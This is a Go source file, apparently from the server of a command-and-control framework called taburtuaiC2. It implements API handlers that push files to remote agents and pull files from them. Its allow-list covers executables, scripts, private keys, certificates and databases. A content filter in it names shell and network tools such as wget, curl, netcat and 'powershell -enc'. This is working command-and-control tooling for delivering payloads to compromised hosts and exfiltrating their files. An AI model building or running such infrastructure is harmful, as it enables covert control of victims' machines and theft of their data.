package api

import (
	"fmt"
	"io"
	"net/http"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/mjopsec/taburtuaiC2/server/services"
	"github.com/mjopsec/taburtuaiC2/shared/types"
)

// UploadToAgent handles file upload to agent with enhanced validation
func (h *Handlers) UploadToAgent(c *gin.Context) {
	agentID := c.Param("id")

	// Validate agent ID format
	if !isValidUUID(agentID) {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Invalid agent ID format")
		return
	}

	// Verify agent
	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}

	if agent.Status != services.StatusOnline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Agent is %s", agent.Status))
		return
	}

	// Get file from form with size limit
	const maxFileSize = 100 * 1024 * 1024 // 100MB
	c.Request.Body = http.MaxBytesReader(c.Writer, c.Request.Body, maxFileSize)

	file, err := c.FormFile("file")
	if err != nil {
		if strings.Contains(err.Error(), "request body too large") {
			c.Status(http.StatusRequestEntityTooLarge)
			h.APIResponse(c, false, "", nil, "File too large (max 100MB)")
			return
		}
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "File not provided: "+err.Error())
		return
	}

	// Validate file size
	if file.Size > maxFileSize {
		c.Status(http.StatusRequestEntityTooLarge)
		h.APIResponse(c, false, "", nil, "File too large (max 100MB)")
		return
	}

	// Validate filename
	if err := validateFileName(file.Filename); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid filename: %v", err))
		return
	}

	destinationPath := c.PostForm("destination_path")
	if destinationPath == "" {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Destination path not provided")
		return
	}

	// Validate destination path
	if err := validateFilePath(destinationPath); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid destination path: %v", err))
		return
	}

	// Validate file extension
	if !isAllowedFileExtension(file.Filename) {
		ext := strings.ToLower(filepath.Ext(file.Filename))
		h.server.Logger.Warn(services.AUDIT,
			fmt.Sprintf("Upload blocked - disallowed file extension: %s", ext),
			agentID, "", map[string]string{
				"filename":  file.Filename,
				"client_ip": c.ClientIP(),
				"extension": ext,
			})
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("File extension '%s' not allowed", ext))
		return
	}

	// Read file content
	srcFile, err := file.Open()
	if err != nil {
		c.Status(http.StatusInternalServerError)
		h.APIResponse(c, false, "", nil, "Failed to open file")
		return
	}
	defer srcFile.Close()

	fileContent, err := io.ReadAll(srcFile)
	if err != nil {
		c.Status(http.StatusInternalServerError)
		h.APIResponse(c, false, "", nil, "Failed to read file")
		return
	}

	// Validate file content (basic checks)
	if err := validateFileContent(fileContent, file.Filename); err != nil {
		h.server.Logger.Warn(services.AUDIT,
			fmt.Sprintf("Upload blocked - invalid file content: %v", err),
			agentID, "", map[string]string{
				"filename":  file.Filename,
				"client_ip": c.ClientIP(),
				"file_size": fmt.Sprintf("%d", len(fileContent)),
			})
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid file content: %v", err))
		return
	}

	// Encrypt if available
	var encryptedContent []byte
	isEncrypted := false

	if h.server.CryptoMgr != nil {
		encrypted, err := h.server.CryptoMgr.EncryptData(fileContent)
		if err != nil {
			h.server.Logger.Error("SYSTEM", "Failed to encrypt file: "+err.Error(), agentID, "", nil)
			c.Status(http.StatusInternalServerError)
			h.APIResponse(c, false, "", nil, "Failed to encrypt file")
			return
		}
		encryptedContent = []byte(encrypted)
		isEncrypted = true
	} else {
		encryptedContent = fileContent
	}

	// Create upload command
	cmd := &types.Command{
		ID:              generateSecureUUID(),
		AgentID:         agentID,
		Command:         "internal_upload",
		OperationType:   "upload",
		DestinationPath: destinationPath,
		FileContent:     encryptedContent,
		IsEncrypted:     isEncrypted,
		CreatedAt:       time.Now(),
		Status:          "pending",
		Timeout:         300,
		Metadata: map[string]string{
			"original_filename": file.Filename,
			"file_size":         fmt.Sprintf("%d", len(fileContent)),
			"content_type":      file.Header.Get("Content-Type"),
			"uploaded_by_ip":    c.ClientIP(),
		},
	}

	// Add to queue with error handling
	if err := h.server.CommandQueue.Add(agentID, cmd); err != nil {
		h.server.Logger.Error("SYSTEM", fmt.Sprintf("Failed to queue upload command: %v", err), agentID, "", nil)
		c.Status(http.StatusInternalServerError)
		h.APIResponse(c, false, "", nil, "Failed to queue upload command")
		return
	}

	h.server.Logger.LogFileTransfer(agentID, "upload", file.Filename, fmt.Sprintf("%d", len(fileContent)), true)

	h.APIResponse(c, true, "File upload command queued", map[string]interface{}{
		"command_id":        cmd.ID,
		"status":            cmd.Status,
		"original_filename": file.Filename,
		"file_size":         len(fileContent),
		"destination_path":  destinationPath,
		"encrypted":         isEncrypted,
	}, "")
}

// DownloadFromAgent handles file download from agent with enhanced validation
func (h *Handlers) DownloadFromAgent(c *gin.Context) {
	agentID := c.Param("id")

	// Validate agent ID format
	if !isValidUUID(agentID) {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Invalid agent ID format")
		return
	}

	// Verify agent
	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}

	if agent.Status != services.StatusOnline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Agent is %s", agent.Status))
		return
	}

	var req struct {
		SourcePath      string `json:"source_path" binding:"required"`
		DestinationPath string `json:"destination_path"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Invalid request: "+err.Error())
		return
	}

	// Validate source path
	if err := validateFilePath(req.SourcePath); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid source path: %v", err))
		return
	}

	// Validate destination path if provided
	if req.DestinationPath != "" {
		if err := validateFilePath(req.DestinationPath); err != nil {
			c.Status(http.StatusBadRequest)
			h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid destination path: %v", err))
			return
		}
	}

	// Check if source file extension is allowed for download
	if !isAllowedFileExtension(req.SourcePath) {
		ext := strings.ToLower(filepath.Ext(req.SourcePath))
		h.server.Logger.Warn(services.AUDIT,
			fmt.Sprintf("Download blocked - disallowed file extension: %s", ext),
			agentID, "", map[string]string{
				"source_path": req.SourcePath,
				"client_ip":   c.ClientIP(),
				"extension":   ext,
			})
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("File extension '%s' not allowed for download", ext))
		return
	}

	// Create download command
	cmd := &types.Command{
		ID:              generateSecureUUID(),
		AgentID:         agentID,
		Command:         "internal_download",
		OperationType:   "download",
		SourcePath:      req.SourcePath,
		DestinationPath: req.DestinationPath,
		CreatedAt:       time.Now(),
		Status:          "pending",
		Timeout:         300,
		Metadata: map[string]string{
			"requested_by_ip": c.ClientIP(),
			"request_time":    time.Now().Format(time.RFC3339),
		},
	}

	// Add to queue with error handling
	if err := h.server.CommandQueue.Add(agentID, cmd); err != nil {
		h.server.Logger.Error("SYSTEM", fmt.Sprintf("Failed to queue download command: %v", err), agentID, "", nil)
		c.Status(http.StatusInternalServerError)
		h.APIResponse(c, false, "", nil, "Failed to queue download command")
		return
	}

	h.server.Logger.LogCommandExecution(agentID, fmt.Sprintf("DOWNLOAD %s", req.SourcePath), "Queued", true)

	h.APIResponse(c, true, "File download command queued", map[string]interface{}{
		"command_id":       cmd.ID,
		"status":           cmd.Status,
		"source_path":      req.SourcePath,
		"destination_path": req.DestinationPath,
	}, "")
}

// ========================================
// SECURITY HELPER FUNCTIONS
// ========================================

// Note: isValidUUID, generateSecureUUID, and validateFilePath are already defined in command_handlers.go

// validateFileName validates file names
func validateFileName(filename string) error {
	if filename == "" {
		return fmt.Errorf("filename cannot be empty")
	}

	if len(filename) > 255 {
		return fmt.Errorf("filename too long (max 255 characters)")
	}

	// Check for dangerous characters
	dangerousChars := []string{"\x00", "\n", "\r", "\t"}
	for _, char := range dangerousChars {
		if strings.Contains(filename, char) {
			return fmt.Errorf("filename contains dangerous character")
		}
	}

	// Check for reserved Windows filenames
	if runtime.GOOS == "windows" {
		reservedNames := []string{
			"CON", "PRN", "AUX", "NUL",
			"COM1", "COM2", "COM3", "COM4", "COM5", "COM6", "COM7", "COM8", "COM9",
			"LPT1", "LPT2", "LPT3", "LPT4", "LPT5", "LPT6", "LPT7", "LPT8", "LPT9",
		}

		baseName := strings.ToUpper(strings.TrimSuffix(filename, filepath.Ext(filename)))
		for _, reserved := range reservedNames {
			if baseName == reserved {
				return fmt.Errorf("filename '%s' is reserved on Windows", filename)
			}
		}
	}

	return nil
}

// isAllowedFileExtension checks if file extension is allowed
func isAllowedFileExtension(filename string) bool {
	allowedExtensions := map[string]bool{
		// Text files
		".txt": true, ".log": true, ".json": true, ".xml": true, ".csv": true,
		".yaml": true, ".yml": true, ".conf": true, ".cfg": true, ".ini": true,
		".md": true, ".html": true, ".htm": true,

		// Scripts
		".bat": true, ".cmd": true, ".sh": true, ".ps1": true, ".py": true,
		".js": true, ".php": true, ".pl": true, ".rb": true,

		// Executables and libraries
		".exe": true, ".dll": true, ".so": true, ".dylib": true,
		".msi": true, ".deb": true, ".rpm": true, ".pkg": true,

		// Archives
		".zip": true, ".rar": true, ".7z": true, ".tar": true, ".gz": true,
		".bz2": true, ".xz": true,

		// Images (for documentation/evidence)
		".jpg": true, ".jpeg": true, ".png": true, ".gif": true, ".bmp": true,
		".ico": true, ".svg": true,

		// Documents
		".pdf": true, ".doc": true, ".docx": true, ".xls": true, ".xlsx": true,
		".ppt": true, ".pptx": true, ".rtf": true,

		// Data files
		".db": true, ".sqlite": true, ".sql": true, ".bak": true,
		".reg": true, ".key": true, ".crt": true, ".pem": true,

		// No extension (common for Unix executables)
		"": true,
	}

	ext := strings.ToLower(filepath.Ext(filename))
	return allowedExtensions[ext]
}

// validateFileContent validates file content for security
func validateFileContent(content []byte, filename string) error {
	if len(content) == 0 {
		return fmt.Errorf("file is empty")
	}

	// Check for null bytes in text files
	if isTextFile(filename) {
		for i, b := range content {
			if b == 0 {
				return fmt.Errorf("null byte found at position %d in text file", i)
			}
		}
	}

	// Check for suspicious patterns in text content
	if isTextFile(filename) {
		contentStr := strings.ToLower(string(content))
		suspiciousPatterns := []string{
			"eval(", "exec(", "system(", "shell_exec(",
			"<script", "javascript:", "vbscript:",
			"powershell -enc", "cmd.exe /c", "bash -c",
			"wget ", "curl ", "nc -", "netcat",
		}

		for _, pattern := range suspiciousPatterns {
			if strings.Contains(contentStr, pattern) {
				return fmt.Errorf("potentially malicious content detected: %s", pattern)
			}
		}
	}

	// Check file size limits based on type
	if isTextFile(filename) && len(content) > 10*1024*1024 { // 10MB for text files
		return fmt.Errorf("text file too large (max 10MB)")
	}

	return nil
}

// isTextFile checks if a file is a text file based on extension
func isTextFile(filename string) bool {
	textExtensions := map[string]bool{
		".txt": true, ".log": true, ".json": true, ".xml": true,
		".csv": true, ".yaml": true, ".yml": true, ".conf": true,
		".cfg": true, ".ini": true, ".md": true, ".html": true,
		".htm": true, ".js": true, ".py": true, ".sh": true,
		".bat": true, ".cmd": true, ".ps1": true, ".php": true,
		".pl": true, ".rb": true, ".sql": true,
	}

	ext := strings.ToLower(filepath.Ext(filename))
	return textExtensions[ext]
}
